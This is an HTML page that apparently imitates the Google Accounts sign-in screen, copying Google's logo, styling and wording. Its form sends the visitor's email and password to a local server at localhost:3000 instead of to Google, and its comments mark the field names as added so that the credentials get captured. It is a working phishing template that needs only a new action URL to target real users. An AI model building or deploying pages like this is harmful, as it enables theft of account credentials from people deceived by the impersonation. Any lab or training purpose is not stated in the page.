<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In – Google Accounts</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border-radius: 8px;
      padding: 40px 30px;
      width: 360px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .logo img {
      height: 40px;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 5px;
      text-align: left;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
      text-align: left;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
    }

    .show-password {
      display: flex;
      align-items: center;
      font-size: 14px;
      margin: 10px 0;
      color: #5f6368;
    }

    .show-password input {
      margin-right: 5px;
    }

    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 20px;
    }

    .actions a {
      font-size: 14px;
      color: #1a73e8;
      text-decoration: none;
    }

    .actions a:hover {
      text-decoration: underline;
    }

    button {
      background-color: #1a73e8;
      color: #fff;
      padding: 10px 24px;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }

    button:hover {
      background-color: #1558b0;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h1>Sign in</h1>
    <p>Use your Google Account</p>

    <!-- ✅ Updated form attributes -->
    <form method="POST" action="http://localhost:3000/login">
      <!-- ✅ Added name="email" -->
      <input type="text" placeholder="Email or phone" name="email" required>
      <!-- ✅ Added name="password" -->
      <input type="password" placeholder="Enter your password" id="password" name="password" required>

      <div class="show-password">
        <input type="checkbox" onclick="togglePassword()" id="showPassword">
        <label for="showPassword">Show password</label>
      </div>

      <div class="actions">
        <a href="https://www.google.com/">Forgot password?</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    }
  </script>

</body>
</html>
